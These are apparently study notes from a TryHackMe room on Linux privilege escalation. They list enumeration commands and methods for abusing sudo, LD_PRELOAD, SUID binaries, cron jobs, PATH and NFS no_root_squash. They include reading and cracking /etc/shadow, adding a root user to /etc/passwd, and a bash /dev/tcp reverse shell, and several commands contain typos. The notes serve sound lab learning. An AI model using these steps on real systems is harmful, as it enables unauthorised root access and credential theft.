<h1 align="center">Linux-Privilage-Escalation</h1>

- <strong><em>These notes are made from the Linux Privilage Escalation room of Tryhackme and do not contain any of the newer mathods to escalate privilages.</em></strong>
<h2 align="left">1.Enumeration</h2>

`hostname`- Show the hostname for the machine

`uname` - shows system information

`/proc/version` - shows abaout the target system processes

`/etc/issue` - shows more system information

`env`- shows environment variables 

`ps aux`-shows processes for all users

`ps -A`-view processes

`ps axjf`-view process tree

`sudo -l`-view what commands your user can execute with sudo privilages

`ls -l`-shows all the files in the directory including hidden ones

`id`-general overview of the privilages of the user

`id (username)`-general overview of the privilages of the asked user

`/etc/passwd`-contains the users list 
>`cat /etc/passwd | cut -d ":" -f 1`-get a clean list of users without additional information

`history`-see the history of commands executed

`ifconfig`-show network information **important for pivoting**
> `iproute`-shows which network route exists

`netstat`
>`netstat -a`-shows all the listning ports

>`netstat -at`-lists tcp and udp protocols

>`netstat -l`-list ports in listening mode

>`netstat -s`-network usage stats by protocols

>`netstat -tp`-list connections with the service name and pid info

>`netstat -i`-interface stats

>`netstat -ano`-display all sockets,resolve names,dispay timers

<h4>Find-</h4>

`find . -name flag1.txt`-find file named flag1.txt in the current directory

`find /home -name flag1.txt`-find file named flag1.txt in the home directory

`find / -type d -name config`-find directory named config in  / 

`find / -type f -perm 0777`-find files with permission 777 in / directory

`find / -perm a=x`-find executables

`find /home -user frank`-find all files for user frank

`find / -mtime 10`-files that were modified in last 10 days

`find / -atime 10`-files that were accessed in last 10 days

`find / -cmin -60`-files changed within last hour(60 mins)

`find / -amin -60`-files accessed within last hour(60 mins)

`find / -size 50m`-files with 50mb size

`2> /dev/null`-*add this to the end to remove errors shown in terminal*

**Find files that can be writeen to and executed form**

`find / -writable`

`find / -perm -222`

`find / -perm -ow`

`find / -perm -ox`

**Find developement tools and supported languages**

`find / -name perl*`

`find / -name python*`

`find / -name gcc*`

**find files with SUID bit set which allows you to run the file with higher privilages**

```bash
find / -per -u=s -type f 2> /dev/null 
```

---

<h2 align="left">2.Automated Enumeration Tools</h2>

1. [LinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

2. [LinEnum](https://github.com/rebootuser/LinEnum)

3. [Linux_exploit_suggester](https://github.com/mzet-/linux-exploit-suggester)

4. [Linux_smart_enumerator](https://github.com/diego-treitos/linux-smart-enumeration)

5. [Linux_priv_checker](https://github.com/sleventyeleven/linuxprivchecker)

<h2 align="left">3.Kernel Exploits</h2>

>**Methodology**
>1. Identify kernel version
>2. Search and find the exploit code for the kernel version
>3. Run the exploit
> *Useful Resources-*
>> [ /Google/ ](https://www.google.com/)
>>[ /Linuxkernelcves.com/ ](https://www.linuxkernelcves.com/)
>> [ /Linux exploit suggester/ ](https://github.com/mzet-/linux-exploit-suggester)

<h2 align="left">4.Sudo</h2>

- `sudo -l`-Tells us about the commands the current user can run with root privilages

- [Getfobins](https://gtfobins.github.io/)-Tells us how the binary or cammand can be exploited to get root privilages

**Leverage application function**
>Apache 2 has a function that supports external loading of config file(`-f`)
>Ie:load etc/shadow file

**Leverage LD_Preload**
>*Methodology*-
>1. check for LD_Preload with env_keep option
>2. Compile simple c code as a shared object (.so extension).
>Code is available [Here](./Ld_preload_tobecompiled_as_sharedobject.c)
>**The program file that you need to compile as shared object is present in this repository**
>```bash
>gcc -FPIC -shared -o shell.so shell.c -nostart files
>```
>3. Now run any command that we can run with sudo and give the shared file command with it 
>```
>sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
>```
>*`find` in the above command is the command that we can execute with root privs* 

- if nmap has sudo privilages -
we need to run (`sudo nmap --intractive` ) to get root shell

- If find has sudo privilages-
we need to run (`sudo find . -exec /bin/sh 1; -quit`) to get root shell

***More ways to exploit can be found on Getfobins***

<h2 align="left">4.SUID</h2>

Find files with special permission set(SUID bit set)

```bash
find / -type f -perm -04000 -ls 2> /dev/null
```

>In cases we have nano with suid bit set  
>**Choice 1**
>>We can try to read `/etc/shadow` and `/etc/passwd` files  
>>Then we can create a file with the userids for passwd file and password hash from shadow file to make a single file and crack the hashes with JohnTheRipper tool.  
>>The command to merge the files containing userid info and hashed password is  
>>```bash
>>unshadow (userid_form_passwd_file) (hashed_passowrd_from_shadow_file) > passcode.txt 
>>```
>**Choice 2**  
>>We can try to add a user with higher privilages in the files 
>>we need to create a hash value of the password we want the user to have
>>```bash
>>openssl passwd -1 -salt (username) (password)
>>```
>>Now add this pass with username to `/etc/passwd`
>>**Format**
>>```bash
>>(username):(hashed openssl value):0:0:root:/root:/bin/bash
>>```

<h2 align="left">5.Capablities</h2>

`getcap`-List capablities  
`getcap -r /`-will be generating huge amounts of errors so we need to redirect the errors to the /dev/null  
`getcap -r / 2> /dev/null`  
search for the capablities on Gtfobin according to the results you get  
**Example**  
>1. If found vim  
>2. Then check for who created the vim folder  
>3. Now look for vim capablities on the Gtfobin  

<h2 align="left">6.Cronjobs</h2>

`/etc/crontab`-File keeping system-wide cron jobs  
>-need to spot a script that is created by root or higher privilaged user in the /etc/crontab file  
>- go to the script and change it to privide a reverse shell to our machine(attacker machine)  
>- if file is deleted we need to create a file with the same name in the same directory where it was stored previously and change it to provide a reverse shell to our machine (attacker machine)  
>```bash
>bash -i >& /dev/tcp/(ip)/(port) 0>&1
>```  

<h2 align="left">7.PATH</h2>

`echo "$PATH"`-Shows all the system path variables  
**Paths work like- Linux finds the called binary in all the folders stated in path variable**  
- `export PATH=/tmp:$PATH`-to add a folder to the path variable
Look for writable folders-  
```bash
find / -writable 2> /dev/null | cut -d "/" -f 2 | sort -u
```
To find for writable folders in sub folders also-  
```bash
find / -writable 2> /dev/null |grep (folder) | cut -d "/" -f 2,3 | sort -u
```
**It is good to find the writable subfolders in the directory which appers frequently in the path variable**  
  
**Methodology**
>1. Find a script that can execute a command and the compiled script of it  
>Ie:[Here](./path_variable_calling_any_system_binary.c)  
>2. read through the script and understand what binary is being called   
>3. look at the path variables and find if you can create files in any of the folders defined in path variable  
>4. if not, try to add a custom folder in which you can create files to the path variable (command stated above)  
>5. create a file named same as the file being called in the script  
>6. give the binary execute permission and SUID bit.    
>(Ie: can write `/bin/bash` in it to get root shell)

<h2 align="left">8.NFS</h2>

**Methodology**
```bash
cat /etc/exports
```
1. see the contents od the exports file in etc directory   
2. look for `no_root_squash` in the file and note the file corresponding to it   
3. use the attacker machine to see the mountable folders on the target machine  
```bash
showmount -e (IP)
```
4. mount a folder to the folder available for mounting on the target machine which has function `no_root_squash`    
*To mount*  
```bash
mount -o rw (IP):(mount folder) (the folder to mount on attaker machine) 
```
*Below steps to be executed on the attacker machine*  
5. now write the executable to be transfered to the target machine for execution  
[Executable](./c_code_to_provide_rootshell.c)  
6. compile the program   
```bash
gcc (name.c) -o (name) -w
```
7. Give executable permission and SUID bit to the compiled program  
```bash
chmod +x (name)
chmod +s (name)
```
*Below steps to be executed on the target machine*  
8. access the executable on the target machine and you will be provided with the root shell     


